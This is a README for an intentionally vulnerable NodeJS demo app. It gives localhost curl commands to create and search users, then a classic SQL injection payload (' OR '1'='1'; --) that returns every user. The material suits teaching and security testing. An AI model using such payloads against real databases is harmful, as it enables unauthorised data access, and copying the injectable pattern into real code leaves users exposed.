# Example of a Vulnerable NodeJS Application

This application is vulnerable to SQL injection. To test the behavior start by :

* Create few Users 
curl -X POST http://localhost:3000/create -H "Content-Type: application/json" -d '{"name":"User1"}'
curl -X POST http://localhost:3000/create -H "Content-Type: application/json" -d '{"name":"User2"}'
curl -X POST http://localhost:3000/create -H "Content-Type: application/json" -d '{"name":"User3"}'
curl -X POST http://localhost:3000/create -H "Content-Type: application/json" -d '{"name":"User4"}'
curl -X POST http://localhost:3000/create -H "Content-Type: application/json" -d '{"name":"User5"}'

* Search for a User 
curl -X POST http://localhost:3000/search -H "Content-Type: application/json" -d '{"userInput":"User1"}'

* SQL Injection to Get All Users
curl -X POST http://localhost:3000/search -H "Content-Type: application/json" -d "{\"userInput\":\"' OR '1'='1'; -- \"}"

* To run the application run `node app.js`


> Author : Lucien Chemaly